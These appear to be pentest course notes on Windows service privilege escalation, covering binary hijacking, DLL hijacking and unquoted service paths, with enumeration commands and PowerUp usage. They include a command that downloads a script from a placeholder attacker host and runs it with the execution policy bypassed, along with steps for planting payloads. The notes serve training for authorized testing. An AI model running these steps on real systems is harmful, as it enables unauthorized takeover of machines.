# Windows Service Abuse

> PEN-200 Chapter 16 covers three service-based privilege-escalation paths: **service binary hijacking**, **service DLL hijacking**, and **unquoted service paths**.

## Service enumeration

A Windows service runs a configured executable under an account such as `LocalSystem`, `Network Service`, `Local Service`, a local user, or a domain user.

```powershell
Get-CimInstance -ClassName win32_service |
  Select-Object Name,State,PathName |
  Where-Object {$_.State -like 'Running'}
```

For unquoted-path hunting, also enumerate stopped services:

```powershell
Get-CimInstance -ClassName win32_service | Select-Object Name,State,PathName
```

PEN-200 notes that `Get-CimInstance`/`Get-Service` may return **Access Denied** for a non-admin user over a network logon such as WinRM or a bind shell; an interactive logon such as RDP may allow the query.

User-installed services outside `C:\Windows\System32` deserve extra attention because their directories/ACLs are controlled by third-party installers/admins.

## ACL quick reference

```powershell
icacls "C:\path\to\file.exe"
```

Important `icacls` masks:

```text
F   Full access
M   Modify
RX  Read + execute
R   Read
W   Write
```

PowerShell alternative:

```powershell
Get-Acl "C:\path\to\file.exe"
```

---

# 1. Service Binary Hijacking

## Conditions

```text
service runs as a more privileged account
        +
you can modify/replace its executable
        +
you can cause the service to start again
        ↓
code executes as the service account
```

Check the executable ACL:

```powershell
icacls "C:\path\to\service.exe"
```

If your user/group has `F`, `M`, or sufficient write permissions, the binary may be replaceable.

## Trigger the replacement

First test whether you can restart/stop/start the service:

```powershell
Restart-Service <SERVICE>
Stop-Service <SERVICE>
Start-Service <SERVICE>
```

or:

```cmd
net stop <SERVICE>
net start <SERVICE>
```

If restart is denied, check whether it starts automatically:

```powershell
Get-CimInstance -ClassName win32_service |
  Select-Object Name,StartMode |
  Where-Object {$_.Name -like '<SERVICE>'}
```

If `StartMode` is `Auto`, a reboot may cause the replaced binary to execute. Check assigned privileges:

```powershell
whoami /priv
```

`SeShutdownPrivilege` being shown as **Disabled** only means the current process is not presently using/enabling it; the privilege is still assigned if it appears in the list.

```cmd
shutdown /r /t 0
```

**Do not reboot production systems casually.** PEN-200 warns that rebooting can disrupt services or leave a system unavailable.

## Cross-compile a Windows payload if needed

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Back up the original service binary before replacing it so you can restore functionality afterward.

## PowerUp — useful, but verify manually

```powershell
iwr -Uri http://<KALI_IP>/PowerUp.ps1 -OutFile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

PowerUp may provide an `AbuseFunction` such as `Install-ServiceBinary`, but Chapter 16 demonstrates a case where the automated abuse function fails even though the file is actually writable. **If the finding looks promising, inspect the ACL/path manually rather than discarding it.**

---

# 2. Service DLL Hijacking

A service executable may load DLLs. If a DLL can be replaced, or if a DLL is missing and Windows searches a writable directory for it, a malicious DLL can run with the service's privileges.

## Standard DLL search order (safe DLL search mode)

```text
1. Application directory
2. System directory
3. 16-bit system directory
4. Windows directory
5. Current directory
6. Directories in PATH
```

If safe DLL search mode is disabled, the current directory moves much earlier in the search order.

## Find missing DLLs

Use **Process Monitor (Procmon)** to observe the service process and look for DLL-related `CreateFile` events with:

```text
NAME NOT FOUND
```

Useful filter idea:

```text
Process Name  is  <SERVICE_BINARY.exe>  → Include
```

Restart the service while Procmon is capturing so the executable performs its DLL loads.

Check the PATH used by the process/user:

```powershell
$env:path
```

If Procmon cannot be run on the target because administrative privileges are required, PEN-200 recommends copying the service binary to a machine you control, installing/running it there, and analyzing its DLL activity locally.

## Exploit a missing DLL

```text
missing DLL name identified
        ↓
find earliest writable directory in DLL search order
        ↓
place malicious DLL there with the exact missing name
        ↓
restart/start service
        ↓
DLL code executes as service account
```

For a custom DLL, code intended to run when the DLL is loaded belongs in `DLL_PROCESS_ATTACH` inside `DllMain`.

Cross-compile a 64-bit DLL:

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

---

# 3. Unquoted Service Paths

An unquoted executable path containing spaces can be interpreted as multiple candidate executable names by Windows.

Example configured path:

```text
C:\Program Files\My Program\My Service\service.exe
```

Windows may try:

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My Service\service.exe
```

## Find candidates

Run this from `cmd.exe` to avoid PowerShell quote escaping issues:

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Then verify three things:

```text
1. Path contains spaces and is not quoted.
2. You can write to one of the candidate directories.
3. You can start/restart the service, or otherwise cause it to start.
```

Check start/stop capability:

```powershell
Start-Service <SERVICE>
Stop-Service <SERVICE>
```

Check each candidate directory:

```powershell
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\<APP_DIR>"
```

Place the payload using the candidate filename Windows will resolve first (for example, `Current.exe` in a writable intermediate directory), then start/restart the service.

## PowerUp automation

```powershell
. .\PowerUp.ps1
Get-UnquotedService
```

If PowerUp identifies a usable path, Chapter 16 demonstrates:

```powershell
Write-ServiceBinary -Name '<SERVICE>' -Path 'C:\writable\candidate.exe'
Restart-Service <SERVICE>
```

Even if the service command returns an error, verify whether the payload still executed before assuming the attack failed.

## Cleanup

Restore original service binaries/DLLs and remove hijack files after validation so normal service behavior is restored.
